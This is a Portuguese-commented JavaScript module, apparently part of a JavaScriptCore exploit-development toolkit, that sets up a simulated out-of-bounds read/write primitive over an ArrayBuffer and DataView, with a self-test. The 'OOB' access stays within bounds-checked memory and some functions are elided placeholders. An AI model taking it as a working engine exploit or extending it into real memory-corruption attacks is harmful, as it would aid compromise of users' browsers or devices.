// js/core_exploit.mjs
import { AdvancedInt64, isAdvancedInt64Object as isAdvInt64ObjFromInt64Module } from './int64.mjs'; // Importa a função de verificação também
import { log, toHexS1, PAUSE_LAB } from './utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;

export function clearOOBEnvironment() {
    // ... (como antes)
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    log(`Limpando ambiente OOB...`, 'info', FNAME_CLEAR);
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    log(`Ambiente OOB limpo.`, 'good', FNAME_CLEAR);
}

export function getOOBAllocationSize() { updateOOBConfigFromUI(); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { updateOOBConfigFromUI(); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { updateOOBConfigFromUI(); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive() {
    // ... (como antes, garantindo a chamada a clearOOBEnvironment())
    const FNAME = 'CoreExploit.triggerOOB_primitive';
    updateOOBConfigFromUI();
    log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
    log(`   Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, 'info', FNAME);
    clearOOBEnvironment(); // Garante limpeza
    try {
        if (OOB_CONFIG.ALLOCATION_SIZE <= 0) throw new Error(`Tamanho de Alocação OOB inválido: ${OOB_CONFIG.ALLOCATION_SIZE}.`);
        const totalSizeNeeded = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
        if (totalSizeNeeded <=0 || OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE > totalSizeNeeded) throw new Error(`Cálculo de tamanho total inválido: ${totalSizeNeeded}.`);
        oob_array_buffer_real = new ArrayBuffer(totalSizeNeeded);
        oob_dataview_real = new DataView(oob_array_buffer_real, OOB_CONFIG.BASE_OFFSET_IN_DV, OOB_CONFIG.ALLOCATION_SIZE);
        log(`Ambiente para Operações OOB CONFIGURADO.`, 'vuln', FNAME);
        log(`   oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME);
        log(`   oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME);
    } catch (e) {
        log(`ERRO CRÍTICO ao tentar configurar ambiente OOB: ${e.name} - ${e.message}`, "error", FNAME);
        console.error("Erro detalhado em triggerOOB_primitive:", e);
        oob_array_buffer_real = null; oob_dataview_real = null;
    }
    log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
}

export function oob_read_relative(relative_offset, byteLength = 4) {
    // ... (guardas e cálculos de offset como antes)
    if (!oob_dataview_real || !oob_array_buffer_real) {
        log("ERRO: Ambiente OOB não ativo para leitura.", "error", "CoreExploit.Read");
        throw new Error("OOB Read: Ambiente não ativo.");
    }

    const dv_offset_from_logical_start_of_oob_window = relative_offset - OOB_CONFIG.INITIAL_BUFFER_SIZE;
    const absoluteReadOffsetInRealBuffer = OOB_CONFIG.BASE_OFFSET_IN_DV + dv_offset_from_logical_start_of_oob_window;

    if (absoluteReadOffsetInRealBuffer < 0 || absoluteReadOffsetInRealBuffer + byteLength > oob_array_buffer_real.byteLength) {
        log(`ERRO Leitura OOB: Offset absoluto ${toHexS1(absoluteReadOffsetInRealBuffer)} (relativo ${toHexS1(relative_offset)}) está FORA dos limites do oob_array_buffer_real total (${oob_array_buffer_real.byteLength} bytes).`, "error", "CoreExploit.Read");
        throw new RangeError(`OOB Read: Tentativa de leitura fora dos limites do buffer real. AbsOffset: ${absoluteReadOffsetInRealBuffer}, Len: ${byteLength}, BufSize: ${oob_array_buffer_real.byteLength}`);
    }
    // ... (log de aviso OOB como antes)

    const tempView = new DataView(oob_array_buffer_real);
    try {
        if (byteLength === 1) return tempView.getUint8(absoluteReadOffsetInRealBuffer);
        if (byteLength === 2) return tempView.getUint16(absoluteReadOffsetInRealBuffer, true);
        if (byteLength === 4) return tempView.getUint32(absoluteReadOffsetInRealBuffer, true);
        if (byteLength === 8) {
            const low = tempView.getUint32(absoluteReadOffsetInRealBuffer, true);
            const high = tempView.getUint32(absoluteReadOffsetInRealBuffer + 4, true);
            const int64Instance = new AdvancedInt64(low, high);
            // ** LOG DE DEPURAÇÃO ADICIONADO AQUI **
            log(`DEBUG_CORE_READ8: Criado AdvancedInt64: low=${toHexS1(low)}, high=${toHexS1(high)}. typeof=${typeof int64Instance}, isAdvInt64ObjFromInt64Module=${isAdvInt64ObjFromInt64Module(int64Instance)}, has isNullPtr=${!!(int64Instance && int64Instance.isNullPtr)}, val=${int64Instance.toString(true)}`, 'info', 'CoreExploit.Read');
            return int64Instance;
        }
        throw new Error("Tamanho de leitura OOB inválido: " + byteLength);
    } catch (e) {
        log(`Exceção durante oob_read_relative em offset abs ${toHexS1(absoluteReadOffsetInRealBuffer)} (rel ${toHexS1(relative_offset)}): ${e.name} - ${e.message}`, "error", "CoreExploit.Read");
        throw e;
    }
}

// oob_write_relative e testModule permanecem como na última versão que corrigiu o erro de TypeError
export function oob_write_relative(relative_offset, value, byteLength = 4) {
    if (!oob_dataview_real || !oob_array_buffer_real) {
        log("ERRO: Ambiente OOB não ativo para escrita.", "error", "CoreExploit.Write");
        throw new Error("OOB Write: Ambiente não ativo.");
    }

    const dv_offset_from_logical_start_of_oob_window = relative_offset - OOB_CONFIG.INITIAL_BUFFER_SIZE;
    const absoluteWriteOffsetInRealBuffer = OOB_CONFIG.BASE_OFFSET_IN_DV + dv_offset_from_logical_start_of_oob_window;

    if (absoluteWriteOffsetInRealBuffer < 0 || absoluteWriteOffsetInRealBuffer + byteLength > oob_array_buffer_real.byteLength) {
        log(`ERRO Escrita OOB: Offset absoluto ${toHexS1(absoluteWriteOffsetInRealBuffer)} (relativo ${toHexS1(relative_offset)}) está FORA dos limites do oob_array_buffer_real total (${oob_array_buffer_real.byteLength} bytes).`, "error", "CoreExploit.Write");
        throw new RangeError(`OOB Write: Tentativa de escrita fora dos limites do buffer real. AbsOffset: ${absoluteWriteOffsetInRealBuffer}, Len: ${byteLength}, BufSize: ${oob_array_buffer_real.byteLength}`);
    }
    
    const tempView = new DataView(oob_array_buffer_real);
    try {
        if (byteLength === 1) { tempView.setUint8(absoluteWriteOffsetInRealBuffer, Number(value)); return; }
        if (byteLength === 2) { tempView.setUint16(absoluteWriteOffsetInRealBuffer, Number(value), true); return; }
        if (byteLength === 4) { tempView.setUint32(absoluteWriteOffsetInRealBuffer, Number(value), true); return; }
        if (byteLength === 8 && value instanceof AdvancedInt64) {
            tempView.setUint32(absoluteWriteOffsetInRealBuffer, value.low(), true);
            tempView.setUint32(absoluteWriteOffsetInRealBuffer + 4, value.high(), true);
            return;
        }
        if (byteLength === 8 && typeof value === 'number') {
             const int64Val = AdvancedInt64.fromNumber(value);
             tempView.setUint32(absoluteWriteOffsetInRealBuffer, int64Val.low(), true);
             tempView.setUint32(absoluteWriteOffsetInRealBuffer + 4, int64Val.high(), true);
             return;
        }
        throw new Error("Tamanho/valor de escrita OOB inválido: " + byteLength + ", valor: " + value);
    } catch (e) {
        log(`Exceção durante oob_write_relative em offset abs ${toHexS1(absoluteWriteOffsetInRealBuffer)} (rel ${toHexS1(relative_offset)}): ${e.message}`, "error", "CoreExploit.Write");
        throw e;
    }
}

export async function testModule(logFnParam) {
    const FNAME_TEST = "CoreExploit.testModule";
    const currentLog = logFnParam || log;
    
    currentLog(`--- Testando Módulo CoreExploit (core_exploit.mjs) ---`, "test", FNAME_TEST);
    await triggerOOB_primitive(); 
    if (!oob_dataview_real) {
        currentLog("Falha ao configurar ambiente OOB. Teste abortado.", "error", FNAME_TEST);
        return;
    }
    
    const test_rel_offset = OOB_CONFIG.INITIAL_BUFFER_SIZE + 0;
    const test_val32 = 0x12345678;
    const test_val64 = new AdvancedInt64("0xAABBCCDDEEFF0011");

    try {
        currentLog(`Escrevendo ${toHexS1(test_val32)} em offset OOB relativo ${test_rel_offset}`, "info", FNAME_TEST);
        oob_write_relative(test_rel_offset, test_val32, 4);
        const read_val32 = oob_read_relative(test_rel_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexS1(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexS1(read_val32)}, esperado ${toHexS1(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_offset = test_rel_offset + 4;
        currentLog(`Escrevendo ${test_val64.toString(true)} em offset OOB relativo ${next_offset}`, "info", FNAME_TEST);
        oob_write_relative(next_offset, test_val64, 8);
        const read_val64 = oob_read_relative(next_offset, 8);
        // Certifique-se que read_val64 é um AdvancedInt64 antes de chamar .equals
        if (read_val64 && typeof read_val64.equals === 'function' && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            const readValStr = (read_val64 && typeof read_val64.toString === 'function') ? read_val64.toString(true) : String(read_val64);
            currentLog(`FALHA: Lido ${readValStr}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST);
        }
    } catch (e) {
        currentLog(`ERRO durante o teste do módulo CoreExploit: ${e.name} - ${e.message}`, "error", FNAME_TEST);
        console.error("Erro em CoreExploit.testModule:", e);
    }
    currentLog(`--- Teste CoreExploit Concluído ---`, "test", FNAME_TEST);
}
